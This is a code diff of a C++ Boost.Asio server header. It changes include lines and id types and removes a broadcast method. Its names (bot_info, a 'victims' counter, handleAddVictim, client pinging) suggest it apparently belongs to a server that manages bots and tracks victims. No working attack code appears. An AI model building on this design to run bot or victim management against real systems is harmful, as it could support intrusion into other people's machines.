@@ -14,6 +14,7 @@
 #include <boost/asio/io_context.hpp>
 #include <boost/bind/bind.hpp>
 #include <chrono>
+#include <cmath>
 #include <cstdint>
 #include <future>
 #include <iostream>
@@ -21,6 +22,7 @@
 #include <mutex>
 #include <optional>
 #include <queue>
+#include <random>
 #include <sstream>
 #include <string>
 #include <unordered_map>
@@ -39,7 +41,7 @@ class server {
 	struct bot_info {
 		int victims = 0;
 		long int msgs_from = 0;
-		size_t id;
+		int id;
 		int ping;
 		int inactive_counter;
 		std::string connected;
@@ -60,13 +62,12 @@ class server {
 	tcp::acceptor acceptor_;
 	std::optional<tcp::socket> socket_;
 
-	void sendAllClients(std::string const &);
 	void pingClients();
 	boost::posix_time::seconds interval_;
 	boost::asio::deadline_timer timer_;
 
 	// Helpers
-	static size_t getClientId_();
+	int getClientId_();
 	static bool isNumber_(const std::string &);
 	bool checkHash_(std::string &);
 	const std::string getCurrentDateTime_();
@@ -84,7 +85,7 @@ class server {
 	void handleAddVictim(std::string &, std::vector<std::string> &params, session *client);
 
 	msg_parser msg_parser_;
-	std::unordered_map<size_t, std::shared_ptr<session>> clients_sessions_container_;
+	std::unordered_map<int, std::shared_ptr<session>> clients_sessions_container_;
 	std::unordered_map<std::string, bot_info> clients_data_container_;
 
 	std::unordered_map<std::string, std::function<void(std::string &, std::vector<std::string> &, session *)>>
